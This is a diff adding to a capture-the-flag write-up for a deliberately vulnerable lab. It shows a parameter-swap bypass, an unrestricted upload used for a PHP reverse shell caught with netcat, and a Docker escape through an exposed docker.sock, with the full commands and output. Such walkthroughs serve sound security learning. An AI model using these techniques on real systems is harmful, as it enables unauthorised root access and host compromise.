@@ -331,7 +331,9 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
 
 ### FOUND: PHPSESSID=5j60rs0h8r7k6gr7g6k6a82gkn. I changed my cookie value and pwned admin account!!
 
-## Access to restricted segments: Finance
+---
+
+## Access to restricted segments: Finance & File Upload Vulnerability
 
 > Now that I compromised the Admin's account, I encountered this page with a new feature. We already know the `/lottery.php` and `/finance.php` endpoints from /mail/dump.txt, but we were told they are only accessible internally. 
 
@@ -341,7 +343,108 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
 
 ![image](Images/Screenshot%20From%202026-07-11%2014-10-18.png)
 
-### Why does it send lottery.php? And what would happen if I changed it to finance.php...?
+> Why does it send lottery.php? And what would happen if I changed it to finance.php...?
 
 ![image](Images/Screenshot%20From%202026-07-11%2014-10-35.png)
 
+> I used the password they leaked through `dump.txt`, and accessed a restricted portal which included a file upload feature.
+
+![image](Images/Screenshot%20From%202026-07-11%2014-19-58.png)
+
+
+> There was no restriction, so I was able to upload reverse shell payload inside the .php file.
+```
+✅ File uploaded successfully in uploads folder!
+File Name: rev.php
+Path: uploads/rev.php
+Size: 2.53 KB
+Type: application/x-php 
+```
+
+> I was expecting it to be inside `/uploads/rev.php`, but after a bit research I discovered that we had to pull the same trick we did to access `finance.php` since it was inside a restricted segment. So I changed the value from finance.php to `uploads/rev.php` and the response hanged. And I got the callback from the server.
+
+```bash
+┌──(root㉿kali)-[~]
+└─# rlwrap nc -lvnp 1234              
+listening on [any] 1234 ...
+connect to [192.168.152.35] from (UNKNOWN) [10.130.163.54] 39272
+Linux 4f18a45cca05 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 GNU/Linux
+sh: 1: w: not found
+uid=0(root) gid=0(root) groups=0(root)
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+
+> I thought that was it, and I would find the flag instantly, but no. Looks like I was inside a docker container, and I had to escape it then I could get the final flag. After some research, I found a way to escape the container:
+
+
+```shell
+root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"Cmd": ["cat", "/mnt/host/etc/passwd"]}' \
+  http://localhost/containers/84ca4e823f81eed4da58c0dec44557d950c0fda456e2040331363f24d2809053/exec
+curl -X POST --unix-socket /var/run/docker.sock \
+>   -H "Content-Type: application/json" \
+>   -d '{"Cmd": ["cat", "/mnt/host/etc/passwd"]}' \
+<58c0dec44557d950c0fda456e2040331363f24d2809053/exec
+{"Id":"a66efc1ec71f2a892fe1e0c972be7ff8655f903f0dc1f971ed85583bd8eae8e7"}
+root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{}' \
+  http://localhost/exec/84ca4e823f81eed4da58c0dec44557d950c0fda456e2040331363f24d2809053/start
+curl -X POST --unix-socket /var/run/docker.sock \
+>   -H "Content-Type: application/json" \
+>   -d '{}' \
+<8c0dec44557d950c0fda456e2040331363f24d2809053/start
+{"message":"No such exec instance: 84ca4e823f81eed4da58c0dec44557d950c0fda456e2040331363f24d2809053"}
+root@4f18a45cca05:/# curl --unix-socket /var/run/docker.sock http://localhost/images/json
+<t /var/run/docker.sock http://localhost/images/json
+[{"Containers":-1,"Created":1749051876,"Id":"sha256:d0bf58293d3b55e65c6eba58d41fd523e952a3504b510c724143d253982e04d0","Labels":null,"ParentId":"sha256:ea4a85af31ff8989e626f9e79f8dda756e6c092f2cd9f2030e64e92dcc98a6b0","RepoDigests":[],"RepoTags":["phpvulnerable:latest"],"SharedSize":-1,"Size":925661204},{"Containers":-1,"Created":1741896719,"Id":"sha256:0ead645a9bc2295fc52474bca67a7eb21d073b013423840272a7a5b9aa472667","Labels":null,"ParentId":"","RepoDigests":["php@sha256:65e15b08d82bbc9dc5bd66824c11cf4b8801f3c5b4fce8ab8f92aac163645f53"],"RepoTags":["php:8.1-cli"],"SharedSize":-1,"Size":526770771}]
+root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
+  "Image": "php:8.1-cli",
+  "Cmd": ["/bin/sh"],
+  "Tty": true,
+  "HostConfig": {
+    "Privileged": true,
+<cker.sock -H "Content-Type: application/json" -d '{
+    "Binds": ["/:/host"]
+  }
+}' http://localhost/containers/create
+>   "Image": "php:8.1-cli",
+>   "Cmd": ["/bin/sh"],
+>   "Tty": true,
+>   "HostConfig": {
+>     "Privileged": true,
+>     "Binds": ["/:/host"]
+>   }
+> }' http://localhost/containers/create
+{"Id":"5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40","Warnings":[]}
+root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40/start
+
+<29548603363a8e59e32a2d151494905c20864a86a3f40/start
+
+root@4f18a45cca05:/# 
+root@4f18a45cca05:/# docker exec -it 29548603363a8e59e32a2d151494905c20864a86a3f40 chroot /host /bin/bash
+<32a2d151494905c20864a86a3f40 chroot /host /bin/bash
+Error: No such container: 29548603363a8e59e32a2d151494905c20864a86a3f40
+root@4f18a45cca05:/# docker exec -it 5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40 chroot /host /bin/bash
+<32a2d151494905c20864a86a3f40 chroot /host /bin/bash
+root@5cead5e22fae:/# id                   id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@5cead5e22fae:/# cd /root             cd /root
+cd /root
+root@5cead5e22fae:~# ls                   ls
+ls
+ bin   flag.txt   lib   root   share   snap  '~'
+root@5cead5e22fae:~# cat flag.txt         cat flag.txt
+cat flag.txt
+THM{...}
+root@5cead5e22fae:~# 
+```
+
+---
+
+### My thoughts: It was a really good one, I especially enjoyed this CTF, because it was not just simple one. It covered many techniques, including social engineering, privilege escalation, restricted endpoint access, file upload, docker escape, etc. I definitely recommend!!!
